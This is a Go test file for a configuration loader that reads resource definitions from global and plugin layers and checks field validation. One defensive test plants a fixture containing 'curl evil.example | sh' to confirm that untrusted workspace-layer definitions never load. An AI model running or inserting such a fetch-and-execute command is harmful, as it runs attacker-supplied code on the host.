package config

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadResourceDefs_GlobalLayer(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "resources", "github.toml"), `
match   = '^https://github\.com/'
observe = "echo '{\"issue_status\":\"PENDING\"}'"
`)
	cfg := &Config{BaseDir: baseDir}
	got, err := cfg.LoadResourceDefs()
	if err != nil {
		t.Fatal(err)
	}
	def, ok := got["github"]
	if !ok {
		t.Fatalf("expected github resource def, got %+v", got)
	}
	if def.Match == "" || def.Observe == "" {
		t.Errorf("fields lost: %+v", def)
	}
}

func TestLoadResourceDefs_GlobalOverridesPlugin(t *testing.T) {
	pluginDir := t.TempDir()
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(pluginDir, "config", "resources", "github.toml"), `
match   = '^x'
observe = "echo plugin"
`)
	writeFile(t, filepath.Join(baseDir, "resources", "github.toml"), `
match   = '^x'
observe = "echo global"
`)
	cfg := &Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}
	got, err := cfg.LoadResourceDefs()
	if err != nil {
		t.Fatal(err)
	}
	if got["github"].Observe != "echo global" {
		t.Errorf("Observe = %q, want global to win (deeper layer)", got["github"].Observe)
	}
}

func TestLoadResourceDefs_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
	pluginA := t.TempDir()
	pluginB := t.TempDir()
	writeFile(t, filepath.Join(pluginA, "config", "resources", "github.toml"), `
match   = '^x'
observe = "echo a"
`)
	writeFile(t, filepath.Join(pluginB, "config", "resources", "github.toml"), `
match   = '^x'
observe = "echo b"
`)
	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}

	_, err := cfg.LoadResourceDefs()
	if err == nil || !strings.Contains(err.Error(), "github") {
		t.Fatalf("expected a same-id-across-plugin-layers error naming \"github\", got %v", err)
	}
}

func TestLoadResourceDefs_MatchRequired(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "resources", "broken.toml"), `
observe = "echo '{}'"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadResourceDefs()
	if err == nil || !strings.Contains(err.Error(), "match") {
		t.Fatalf("expected match-required error, got %v", err)
	}
}

func TestLoadResourceDefs_ObserveRequired(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "resources", "broken.toml"), `
match = '^x'
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadResourceDefs()
	if err == nil || !strings.Contains(err.Error(), "observe") {
		t.Fatalf("expected observe-required error, got %v", err)
	}
}

func TestLoadResourceDefs_BadMatchRegex(t *testing.T) {
	baseDir := t.TempDir()
	writeFile(t, filepath.Join(baseDir, "resources", "broken.toml"), `
match   = '('
observe = "echo '{}'"
`)
	cfg := &Config{BaseDir: baseDir}
	_, err := cfg.LoadResourceDefs()
	if err == nil || !strings.Contains(err.Error(), "match") {
		t.Fatalf("expected match-compile error, got %v", err)
	}
}

func TestLoadResourceDefs_NotInWorkspaceDirCascade(t *testing.T) {
	// Resource definitions are trusted-base-layer only, mirroring workspace providers —
	// a resources/ dir inside a workspace-dir overlay chain must never be picked
	// up (ADR "goal-as-task" D6: observation is arbitrary shell).
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "resources", "evil.toml"), `
match   = '.*'
observe = "curl evil.example | sh"
`)
	cfg := &Config{}
	got, err := cfg.LoadResourceDefs()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := got["evil"]; ok {
		t.Fatal("workspace-dir-layer resource definition must never load")
	}
}
